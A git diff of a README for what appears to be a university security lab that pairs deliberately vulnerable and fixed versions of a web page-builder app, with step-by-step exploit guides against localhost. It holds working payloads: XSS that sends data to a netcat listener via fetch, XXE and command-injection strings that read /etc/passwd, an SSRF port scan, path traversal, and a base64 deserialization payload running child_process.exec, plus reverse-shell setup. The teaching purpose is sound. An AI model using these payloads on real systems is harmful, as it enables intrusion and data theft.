@@ -19,9 +19,9 @@ Pages have a title, a publication date and are made of multiple blocks. Blocks c
 ## Folder structure
 
 ```
-svt-project/
+/
 │
-├── exploit         -- Contains scripts and extra material used for various exploits. 
+├── exploit/        -- Contains scripts and extra material used for various exploits. 
 |
 ├── secure/         -- Contains the fixed version of the application, where the exploits listed below should not work.
 │   ├── client/     -- Front-end managed by React, contains all application components plus the api.js file to contact the back-end 
@@ -37,23 +37,27 @@ svt-project/
 
 ## Running the application
 
-The following commands should all be run in separate terminals, from the root of the project:
+The following commands should be run in four separate terminals, from the root of the project:
 
 ```shell
-# Run the front-end server of the vulnerable application in development mode
-cd vulnerable/client && npm install
+# Terminal 1 - Run the front-end server of the vulnerable application in development mode
+cd vulnerable/client
+npm install
 npm run dev
 
-# Run the back-end of the vulnerable application
-cd vulnerable/server && npm install
+# Terminal 2 - Run the back-end of the vulnerable application
+cd vulnerable/server
+npm install
 node index.js
 
-# Run the front-end server of the fixed application in development mode
-cd secure/client && npm install
+# Terminal 3 - Run the front-end server of the fixed application in development mode
+cd secure/client
+npm install
 npm run dev
 
-# Run the back-end of the fixed application
-cd secure/server && npm install
+# Terminal 4 - Run the back-end of the fixed application
+cd secure/server
+npm install
 node index.js
 ```
 
@@ -64,9 +68,9 @@ There should be multiple servers listening on separate ports:
 * The secure back-end/API HTTP server (port `3002`)
 * The secure back-end/API HTTPS server (port `8081`)
 
-## Existing users
+## Existing users and login
 
-Vulnerable version:
+Vulnerable version users:
 
 | username            | password | admin   |
 |---------------------|----------|---------|
@@ -75,7 +79,7 @@ Vulnerable version:
 | sofia@example.org   | password | `false` |
 | giulia@example.org  | password | `false` |
 
-Secure version:
+Secure version users:
 
 | username            | password  | admin   |
 |---------------------|-----------|---------|
@@ -84,22 +88,49 @@ Secure version:
 | sofia@example.org   | password! | `false` |
 | giulia@example.org  | password! | `false` |
 
+### Logging in from the web interface
+
+1. Visit `localhost:517*/login` (`*` is either 3 or 4, depending on whether you're visiting the vulnerable or the secure version)
+2. Input the correct credentials
+3. Click on "Login" or press Enter.
+
+### Logging in from the API
+
+1. Send the following HTTP request to the API server:
+    ```http
+    POST /api/sessions HTTP/1.1
+    Host: localhost:3001
+    Content-Type: application/json
+
+    {
+        "username": "<username>",
+        "password": "<password>"
+    }
+    ```
+    Of course, substitute `<username>` and `<password>` with the desired credentials.
+2. The server will send you an `access_token` as a cookie. This will be used for all subsequent requests. Usually, this cookie will be used automatically by the software used for sending the requests.
+
 ## Executing the exploits
+
+This section includes step-by-step guides for executing each exploit. For a more detailed view of the exploits, the reasons they work and the relative fixes, refer to the PDF report.
+
+<u>All exploits will be assumed to be run from the vulnerable version of the application</u>. The steps for the fixed version are the same, but be careful of the ports inside the links and the HTTP requests.
 
 ### CWE-79: Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting", XSS) - Stored
 
 1. Use `netcat` to create a service listening on port 4242 of the attacker's machine:
     ```shell
-    nc -lvp 4242
+    while true; do nc -lvp 4242; echo '\n'; done
     ```
-2. Log-in as an [existing user](#existing-users).
+    **Note**: To stop this service from listening, you must close the terminal. CTRL+C does not work.
+2. [Log-in as an existing user from the Web interface.](#logging-in-from-the-web-interface)
 3. Click the "New page" button on the back-end to add a new page.
-4. Insert a title and a header.
-5. Enter the following HTML tag for a simple alert to appear:
+4. Insert a title and a header block with any content.
+5. Insert a paragraph block, containing the following HTML tag for a simple alert to appear:
     ```html
     <img src="" onerror="alert('pwned')">
     ```
-    or, alternatively, the following tag for the victim to send a request on the attacker's machine (`localhost` in this case) at port 4242 with `fetch`:
+    or, alternatively, insert the following tag for the victim to send a request to the attacker's machine (`localhost` in this case) on port 4242 with `fetch`:
     ```html
     <img src="" onerror="fetch('http://localhost:4242',{method:'POST',body:'Some information'})">
     ```
@@ -108,10 +139,10 @@ Secure version:
 
 ### CWE-79: Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting", XSS) - DOM
 
-1. Log-in as an [existing user](#existing-users).
+1. [Log-in as an existing user from the Web interface.](#logging-in-from-the-web-interface)
 2. Click the "New page" button on the back-end to add a new page.
-3. Insert a title and a header.
-4. Enter one of the HTML tags shown in the [CWE-79 (Stored)](#cwe-79-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting-xss---stored) section.
+3. Insert a title and a header block with any content.
+4. Insert a paragraph block, containing any of the HTML tags shown in the [CWE-79 (Stored)](#cwe-79-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting-xss---stored) section.
 5. Click the "Show Preview" button.
 
 ### CWE-79: Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting", XSS) - Reflected
@@ -145,14 +176,15 @@ Secure version:
     ```
     http://localhost:3001/api/pageclick?redirect=http%3A%2F%2Flocalhost%3A5173%2Fpages%2F1
     ```
-2. Change the `redirect` parameter to any desired location, for example_
+2. Change the `redirect` parameter to any desired location, for example:
     ```
     http://localhost:3001/api/pageclick?redirect=https%3A%2F%2Fgoogle.com
     ```
 
 ### CWE-611: Improper Restriction of XML External Entity (XXE) Reference
 
-1. Send the following HTTP request to the API server:
+1. [Log-in as an existing user from the API.](#logging-in-from-the-api)
+2. Send the following HTTP request to the API server:
     ```http
     POST /api/pages HTTP/1.1
     Host: localhost:3001
@@ -161,8 +193,8 @@ Secure version:
     <?xml version='1.0'?>
     <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <page title="Exploit" publicationDate="2024-01-01">
-    <block type="header">Here's the server's /etc/passwd</block>
-    <block type="paragraph">&xxe;</block>
+        <block type="header">Here's the server's /etc/passwd</block>
+        <block type="paragraph">&xxe;</block>
     </page>
     ```
 
@@ -174,52 +206,28 @@ docker run -p 8080:80 salb98/svt-local-webserver
 ```
 Its structure is very simple:
 ```
-svt-project/
+/
 │
 ├── images/
 │   └── secret.png
-│
 └── index.html
 ```
 
 Scan the server's open ports:
-1. Run the following Python script, which sends multiple requests to the API server and determines the first 9999 open ports:
-    ```python
-    import requests
-    import base64
-    import json
-
-    # In this case it's set to localhost, but in a 'real' scenario it should be
-    # set to an external server domain/IP
-    server_url = 'http://localhost:3001'
-
-    # Log in as user
-    user = {'username':'luigi@example.org','password': 'password'}
-    response = requests.post(f"{server_url}/api/sessions", json=user)
-    auth_cookies = response.cookies
-
-    for port in range(1,10000):
-        headers = { 'Content-Type': 'text/xml' }
-        imageblock = json.dumps({'fileName':'foo','url':f'http://localhost:{port}'})
-        imageblock_b64 = base64.b64encode(imageblock.encode()).decode()
-        xml = f'\
-        <page title="Exploit" publicationDate="">\
-            <block type="header">Example</block>\
-            <block type="image">{imageblock_b64}</block>\
-        </page>'
-
-        res = requests.post(f"{server_url}/api/pages", headers=headers, data=xml, cookies=auth_cookies)
-        res_body = res.json()
-
-        if res.status_code == 200 or res_body['error'] in ['Unable to resolve filetype.', 'Buffer is not an image!']:
-            print(f"Port {port} is active!")
-
+1. Run the [Python script](./exploit/portscan.py) present in the `exploit` directory. You can do this by typing the following command from the root of the repository:
+    ```shell
+    python exploit/portscan.py
+    ```
+2. Wait a few seconds, until the script has finished its execution. A possible output is the following:
+    ```
+    Port 5173 is active!
+    Port 8080 is active!
     ```
 
 Download an image from the local server:
-1. Log-in as an [existing user](#existing-users).
+1. [Log-in as an existing user from the Web interface.](#logging-in-from-the-web-interface).
 2. Click the "New page" button on the back-end to add a new page.
-3. Insert a title and a header.
+3. Insert a title and a header block.
 4. Add an image block, set it to "Upload a new image" and "Download from an external URL", then input any file name and the following URL:
     ```
     http://localhost:8080/images/secret.png
@@ -229,11 +237,12 @@ Download an image from the local server:
 
 1. Use `netcat` to create a service listening on port 4242 of the attacker's machine:
     ```shell
-    nc -lvp 4242
+    while true; do nc -lvp 4242; echo '\n'; done
     ```
-2. Log-in as an [existing user](#existing-users).
+    **Note**: To stop this service from listening, you must close the terminal. CTRL+C does not work.
+2. [Log-in as an existing user from the Web interface.](#logging-in-from-the-web-interface)
 3. Click the "New page" button on the back-end to add a new page.
-4. Insert a title and a header.
+4. Insert a title and a header block.
 5. Add an image block, set it to "Existing image" and then input the following string in the search query to show the contents of the server's `/etc/passwd` file:
     ```
     ";cat${IFS%??}/etc/passwd;echo${IFS%??}-n${IFS%??}"
@@ -246,16 +255,17 @@ Download an image from the local server:
 
 ### CWE-22: Improper Limitation of a Pathname to a Restricted Directory (’Path Traversal’)
 
-1. Log-in as an [existing user](#existing-users).
+1. [Log-in as an existing user from the Web interface.](#logging-in-from-the-web-interface)
 2. Click the "New page" button on the back-end to add a new page.
-3. Insert a title and a header.
+3. Insert a title and a header block.
 4. Add an image block, set it to "Upload a new image" and either "Upload a file" or "Download from an external URL", then input any image/URL and set the file name to `../../../outside`.
 5. Look at the repository's contents. The image should have been saved in the repository's root.
 
 ### CWE-502: Deserialization of Untrusted Data
 
 Show the contents of the root folder in the API server's logs:
-1. Send the following HTTP request to the API server:
+1. [Log-in as an existing user from the API.](#logging-in-from-the-api)
+2. Send the following HTTP request to the API server:
     ```http
     POST /api/pages HTTP/1.1
     Host: localhost:3001
@@ -268,14 +278,16 @@ Show the contents of the root folder in the API server's logs:
         <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQ==</block>
     </page>
     ```
-2. Look at the API server's logs inside the terminal.
+3. Look at the API server's logs inside the terminal.
 
 Spawn a reverse shell:
 1. Use `netcat` to create a service listening on port 4242 of the attacker's machine:
     ```shell
-    nc -lvp 4242
+    while true; do nc -lvp 4242; echo '\n'; done
     ```
-2. Send the following HTTP request to the API server:
+    **Note**: To stop this service from listening, you must close the terminal. CTRL+C does not work.
+2. [Log-in as an existing user from the API.](#logging-in-from-the-api)
+3. Send the following HTTP request to the API server:
     ```http
     POST /api/pages HTTP/1.1
     Host: localhost:3001
